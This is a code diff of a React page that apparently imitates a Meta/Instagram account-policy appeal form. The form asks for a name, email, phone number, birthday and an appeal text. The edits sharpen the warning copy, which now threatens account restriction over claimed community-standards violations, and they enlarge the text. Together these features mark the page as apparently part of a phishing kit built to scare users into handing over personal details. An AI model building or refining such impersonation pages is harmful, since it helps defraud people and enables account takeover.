@@ -17,8 +17,8 @@ const Home = () => {
             privacySecurity: 'Privacy, Safety and Security',
             policiesReporting: 'Policies and Reporting',
             pagePolicyAppeals: 'Account Policy Complaints',
-            detectedActivity: "We have detected unusual activity on your Page connected to your Instagram, including reported guideline and copyright violations.",
-            accessLimited: 'To avoid having your account locked, please verify so that the review process is processed quickly and accurately.',
+            detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
+            accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
             submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
             pageName: 'Name',
             mail: 'Email',
@@ -273,21 +273,21 @@ const Home = () => {
                         <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                             <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
+                        <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                             <p className='mb-3'>{translatedTexts.detectedActivity}</p>
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
                         <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
                                 <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
                                 <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
@@ -295,17 +295,17 @@ const Home = () => {
                                 {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
                                     <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
@@ -340,13 +340,13 @@ const Home = () => {
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
                                     rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base sm:text-sm ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base sm:text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
                                     onChange={(e) => handleInputChange('appeal', e.target.value)}
